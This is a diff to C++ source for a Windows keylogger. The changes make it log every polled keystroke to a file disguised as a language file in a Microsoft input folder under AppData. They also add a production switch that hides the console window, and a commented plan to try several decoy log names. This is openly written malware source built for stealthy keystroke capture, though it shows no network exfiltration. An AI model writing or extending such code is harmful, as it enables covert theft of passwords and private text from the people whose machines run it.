@@ -6,32 +6,46 @@
 #include <fstream>
 
 
-#include <WinUser.h> // for keyboard VK_ definitions and GetAsyncKeyState()
+#include <WinUser.h>
 
 using namespace std;
 
 #define DELIMITER " "
-#define LOG_LOCATION "C:\Users\harsj\AppData\Local\Microsoft\input\ar-QA"
-#define LOG_FILENAME " lang.txt"
+#define LOG_LOCATION "C:\\Users\\harsj\\AppData\\Local\\Microsoft\\input\\ar-QA\\"
+#define LOG_FILENAME "lang.txt"
+#define PRODUCTION false
+
 
 bool handle_special_key_press(char key, std::ostream& stream);
 void log(std::ostream&);
 
+//const char* valid_log_directories[] = {
+//	"lang.txt",
+//	"usa.txt",
+//	"nine.txt"
+//};
+
 int main()
 {
 	// to hide the window
-	// ShowWindow(GetConsoleWindow(), SW_HIDE);
+	ShowWindow(GetConsoleWindow(), PRODUCTION ? SW_HIDE : SW_SHOWNORMAL);
 	cout << "Hello CMake." << endl;
 	cout << "Logging Begins ...." << endl;
 
 	// Getting output stream ready
 	ofstream out_file;
-	out_file.open("log.txt", ios::app);
+	out_file.open(LOG_LOCATION LOG_FILENAME, ios::app);
+	
+	// what if we are unable to open a file, Try different locations from list !
+	if (out_file.is_open())
+	{
+		log(out_file);
+	}
+	else {
+		// log(cout);
+	}
 
-
-	log(cout);
-
-
+	out_file.close();
 	return 0;
 }
 
@@ -39,6 +53,7 @@ void log(std::ostream& Sink)
 {
 	char key = 0;
 	bool handled_as_special_key = false;
+
 	while (true)
 	{
 		for (key = 0; key < 0xfe; key++)
@@ -47,14 +62,14 @@ void log(std::ostream& Sink)
 			{
 				handled_as_special_key = handle_special_key_press(key, Sink);
 				if (handled_as_special_key) continue;
-				cout << key << DELIMITER;
+				Sink << key << DELIMITER;
 			}
 		}
 		Sleep(1000);
 	}
 }
 
-bool handle_special_key_press(char key, std::ostream& stream)
+inline bool handle_special_key_press(char key, std::ostream& stream)
 {
 	switch (key)
 	{
